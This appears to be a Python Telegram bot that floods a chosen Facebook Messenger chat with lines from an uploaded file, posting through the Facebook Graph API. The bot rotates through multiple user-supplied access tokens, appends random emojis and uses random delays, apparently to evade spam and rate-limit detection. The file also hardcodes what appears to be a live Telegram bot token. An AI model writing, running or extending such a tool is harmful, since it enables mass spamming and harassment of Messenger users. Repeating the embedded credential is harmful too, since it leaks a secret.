import requests
import time
import random
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

TELEGRAM_BOT_TOKEN = "7635741820:AAGAks8tA7qTJb5W6lSOpE1uMqG2Y9POvdg"

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

TOKEN_COUNT, GET_TOKENS, CHAT_ID, DELAY, MESSAGE_FILE = range(5)

is_sending_active = False  

# Random emoji generator
def random_emoji():
    emojis = ["😀", "😎", "🔥", "💯", "🚀", "✨", "🎉", "😂", "😇"]
    return random.choice(emojis)

# Facebook Messenger message sender
async def send_facebook_message(access_token, chat_id, message):
    url = f"https://graph.facebook.com/v15.0/t_{chat_id}/"
    payload = {"access_token": access_token, "message": message + " " + random_emoji()}
    response = requests.post(url, json=payload)

    if response.ok:
        logging.info(f"✅ Message sent: {message}")
        return True
    else:
        logging.error(f"❌ Failed to send message: {response.text}")
        return False

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = True  
    await update.message.reply_text("🤖 Welcome! How many Facebook tokens do you want to use?")
    return TOKEN_COUNT

# Stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = False  
    await update.message.reply_text("🛑 Stopping message sending process.")
    return ConversationHandler.END  

# Restart command
async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = True  
    await update.message.reply_text("🔄 Restarting your bot session...")
    return await start(update, context)

# Get number of tokens
async def get_token_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        token_count = int(update.message.text)
        if token_count < 1:
            raise ValueError
        context.user_data["token_count"] = token_count
        context.user_data["tokens"] = []
        await update.message.reply_text(f"✅ You selected {token_count} tokens. Now send them one by one.")
        return GET_TOKENS
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number (1 or more).")
        return TOKEN_COUNT

# Collect tokens from the user
async def get_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tokens"].append(update.message.text)
    
    if len(context.user_data["tokens"]) < context.user_data["token_count"]:
        await update.message.reply_text(f"✅ Token {len(context.user_data['tokens'])} saved. Send the next one.")
        return GET_TOKENS
    
    await update.message.reply_text("✅ All tokens saved! Now enter the **Facebook Chat ID**:")
    return CHAT_ID

# Get chat ID
async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["chat_id"] = update.message.text
    await update.message.reply_text("✅ Chat ID saved! Now enter the **delay in seconds**:")
    return DELAY

# Get delay
async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["delay"] = int(update.message.text)
        await update.message.reply_text("✅ Delay saved! Now please upload a **message file (.txt)**:")
        return MESSAGE_FILE
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please enter a valid number for delay.")
        return DELAY

# Receive message file
async def receive_message_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    file_id = file.file_id
    new_file = await context.bot.get_file(file_id)
    file_path = f'./{file.file_name}'
    await new_file.download_to_drive(file_path)

    context.user_data["file_path"] = file_path
    await update.message.reply_text("✅ Message file uploaded successfully! Now type /send to start sending messages.")
    return ConversationHandler.END

# Send messages
async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active

    tokens = context.user_data.get("tokens", [])
    chat_id = context.user_data.get("chat_id")
    delay = context.user_data.get("delay")
    file_path = context.user_data.get("file_path")

    if not tokens or not chat_id or delay is None or not file_path:
        await update.message.reply_text("❌ Error: Missing token, chat ID, delay, or message file.")
        return

    try:
        with open(file_path, "r") as f:
            messages = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        await update.message.reply_text("❌ Error: Could not read the uploaded message file!")
        return

    token_index = 0  
    for message in messages:
        if not is_sending_active:
            await update.message.reply_text("🛑 Message sending has been stopped.")
            break  

        current_token = tokens[token_index]
        success = await send_facebook_message(current_token, chat_id, message)
        
        if not success:
            await update.message.reply_text(f"❌ Token {token_index+1} failed! Trying the next one.")
        
        token_index = (token_index + 1) % len(tokens)  

        random_delay = random.uniform(2, 5)  
        time.sleep(random_delay)

    await update.message.reply_text("✅ All messages sent successfully!" if is_sending_active else "🛑 Stopped sending messages.")
    return ConversationHandler.END  

# Telegram bot setup
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token_count)],
            GET_TOKENS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tokens)],
            CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chat_id)],
            DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
            MESSAGE_FILE: [MessageHandler(filters.Document.ALL, receive_message_file)]
        },
        fallbacks=[]
    )

    app.add_handler(conv_handler)

    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("restart", restart))
    app.add_handler(CommandHandler("send", send_message))

    app.run_polling()

if __name__ == "__main__":
    main()
